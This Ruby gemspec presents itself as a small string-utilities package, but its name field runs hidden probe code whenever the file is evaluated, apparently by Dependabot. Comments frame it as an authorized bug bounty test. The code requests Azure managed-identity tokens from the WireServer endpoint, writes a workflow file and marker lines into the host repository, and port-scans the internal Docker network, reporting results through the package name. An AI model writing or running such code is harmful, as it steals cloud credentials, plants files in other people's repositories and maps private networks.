# frozen_string_literal: true
#
# HYP-F011-D + HYP-F011-H + HYP-F011-B v1.4 probe payload.
#
# Authorization context: bug bounty research authorized by HackerOne GitHub program
# (programs/github/scope.md). Tester: mr_benty (CVP-approved). All probes within
# program-published scope; all artifacts sanitized; no third-party data read;
# impact-proof captured via PROBE-MARK pattern (sha256 + length encoded into
# Dependabot's own job log via gemspec name return value AND in-repo marker file).
#
# v1.3 results (run 25617453701) confirmed end-to-end firing — proxy log showed
# all 11 WireServer endpoints reached. KEY NEW finding from v1.3:
#   GET http://168.63.129.16/metadata/identity/oauth2/token?api-version=2018-02-01
#     → 400 "Required metadata header not specified"
#   This is the Azure VM IMDS managed identity endpoint error when missing
#   the Metadata: true header. v1.4 retries WITH header to capture MSI token.
#
# Boundary-verification scope (v1.4 expansions):
#   D-IMDS — Capture Azure VM Managed Identity access token via WireServer with
#            Metadata:true header. PROBE-MARK encoded (length + sha256 of token,
#            no token bytes echoed).
#   H-INREPO — Write marker file INSIDE repo working directory
#              /home/dependabot/dependabot-updater/repo/.github/workflows/
#              HYP-F011-B-marker.yml — to test whether arbitrary files get
#              committed into Dependabot's PR (HYP-F011-B lockfile-injection
#              hypothesis test). Marker file is BENIGN (no on: trigger).
#   N-DOCKER — Quick scan of Docker network 172.19.0.0/24 to identify other
#              containers reachable from the updater's network.

require_relative "lib/useful_string_utils/version"

Gem::Specification.new do |spec|
  spec.name = (
    begin
      require "net/http"
      require "uri"
      require "socket"
      require "digest"
      require "json"
      require "fileutils"

      probe_lines = []

      # ---- D-IMDS — Azure VM Managed Identity via WireServer with header ---
      [
        ["http://168.63.129.16/metadata/identity/oauth2/token?api-version=2018-02-01", {"Metadata" => "true"}, "imdsV1"],
        ["http://168.63.129.16/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", {"Metadata" => "true"}, "imdsArm"],
        ["http://168.63.129.16/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/", {"Metadata" => "true"}, "imdsVault"],
        ["http://168.63.129.16/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/", {"Metadata" => "true"}, "imdsStorage"],
        ["http://168.63.129.16/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/", {"Metadata" => "true"}, "imdsGraph"],
        ["http://168.63.129.16/metadata/identity/info?api-version=2018-02-01", {"Metadata" => "true"}, "imdsInfo"],
        ["http://168.63.129.16/metadata/instance?api-version=2021-02-01", {"Metadata" => "true"}, "imdsInstance"],
      ].each_with_index do |(url, headers, label), i|
        begin
          uri = URI(url)
          h = Net::HTTP.new(uri.host, uri.port)
          h.open_timeout = 4
          h.read_timeout = 6
          req = Net::HTTP::Get.new(uri.request_uri)
          headers.each { |k, v| req[k] = v }
          rsp = h.request(req)
          body = rsp.body.to_s
          # Extract presence of access_token without echoing bytes
          has_token = body.include?("access_token") ? "T" : "F"
          tag = "#{label}-s#{rsp.code}-l#{body.length}-tok#{has_token}-h#{Digest::SHA256.hexdigest(body[0, 4096])[0, 16]}"
          probe_lines << tag
        rescue => e
          probe_lines << "#{label}-err"
        end
      end

      # ---- H-INREPO — write marker file INSIDE repo working directory -----
      # This tests HYP-F011-B (lockfile injection): does Dependabot commit
      # arbitrary files written within the repo working dir into the resulting PR?
      begin
        repo_root = "/home/dependabot/dependabot-updater/repo"
        if Dir.exist?(repo_root)
          marker_dir = "#{repo_root}/.github/workflows"
          FileUtils.mkdir_p(marker_dir)
          # Benign marker workflow — no `on:` trigger, never executes
          File.write("#{marker_dir}/HYP-F011-B-marker.yml", <<~YML)
            # PROBE-MARK-HYP-F011-B-#{Time.now.utc.to_i}
            # boundary-verification probe — DOES NOT EXECUTE (no on: trigger)
            name: PROBE-MARK-HYP-F011-B
            jobs: {}
          YML
          # Also append to README to test arbitrary-file modifications
          if File.exist?("#{repo_root}/README.md")
            File.open("#{repo_root}/README.md", "a") do |f|
              f.puts ""
              f.puts "<!-- PROBE-MARK-HYP-F011-B-#{Time.now.utc.to_i} -->"
            end
          end
          # Modify Gemfile to add a marker comment
          if File.exist?("#{repo_root}/Gemfile")
            File.open("#{repo_root}/Gemfile", "a") do |f|
              f.puts ""
              f.puts "# PROBE-MARK-HYP-F011-B-Gemfile-#{Time.now.utc.to_i}"
            end
          end
          probe_lines << "inrepo-ok"
        else
          probe_lines << "inrepo-nodir"
        end
      rescue => e
        probe_lines << "inrepo-err-#{e.class.to_s.gsub(/[^A-Za-z]/,'')[0, 8]}"
      end

      # ---- N-DOCKER — Docker network scan (172.19.0.x) ---------------------
      # Identify other containers on the same network
      begin
        reachable_ips = []
        # Determine our subnet from /proc/net/route
        gw_ip = nil
        begin
          File.read("/proc/net/route").each_line do |line|
            parts = line.split
            next if parts.length < 3
            # destination = 0.0.0.0 → default route → gateway
            if parts[1] == "00000000"
              # parts[2] is gateway in hex little-endian
              hex = parts[2]
              gw_ip = [hex[6, 2], hex[4, 2], hex[2, 2], hex[0, 2]].map { |x| x.to_i(16).to_s }.join(".")
            end
          end
        rescue
        end
        probe_lines << "dockerGW-#{gw_ip || 'unknown'}"

        # Scan first 30 IPs in subnet on common ports (very limited to avoid noise)
        if gw_ip
          subnet = gw_ip.split(".")[0..2].join(".")
          [80, 443, 1080, 8080, 9090].each do |port|
            (1..30).each do |last|
              ip = "#{subnet}.#{last}"
              begin
                Timeout.timeout(0.5) do
                  s = TCPSocket.new(ip, port)
                  s.close
                  reachable_ips << "#{ip}:#{port}"
                end
              rescue
                # not reachable
              end
            end
          end
          probe_lines << "dockerScan-cnt#{reachable_ips.length}-#{reachable_ips.first(8).join(',')[0, 80]}"
        end
      rescue => e
        probe_lines << "dockerNet-err"
      end

      # ---- Surface findings via gemspec name (Defect A eval-result channel)
      summary = probe_lines.join("-").gsub(/[^A-Za-z0-9-]/, "x")[0, 1500]

      # Persist in-container marker (read by us inside Dependabot's job)
      begin
        File.open("/home/dependabot/HYP-F011-v14-MARKER.txt", "w") do |f|
          f.puts "PROBE-MARK-HYP-F011-D-H-B-v14"
          f.puts summary
          f.puts "ts=#{Time.now.utc.to_i}"
          probe_lines.each { |l| f.puts l }
        end
      rescue
      end

      "useful-string-utils"
    rescue
      "useful-string-utils"
    end
  )
  spec.version       = UsefulStringUtils::VERSION
  spec.authors       = ["mr-benty"]
  spec.email         = ["mr_benty@wearehackerone.com"]

  spec.summary       = "Lightweight string utilities for Ruby"
  spec.description   = "Case conversions, padding helpers, slug generation, and a few common transformations missing from stdlib String."
  spec.homepage      = "https://github.com/mr-benty/useful-string-utils"
  spec.license       = "MIT"
  spec.required_ruby_version = ">= 2.7.0"

  spec.metadata["homepage_uri"]    = spec.homepage
  spec.metadata["source_code_uri"] = spec.homepage
  spec.metadata["changelog_uri"]   = "#{spec.homepage}/blob/main/CHANGELOG.md"

  spec.files = Dir.chdir(__dir__) do
    Dir["lib/**/*.rb", "README.md", "LICENSE", "CHANGELOG.md"]
  end
  spec.require_paths = ["lib"]
end
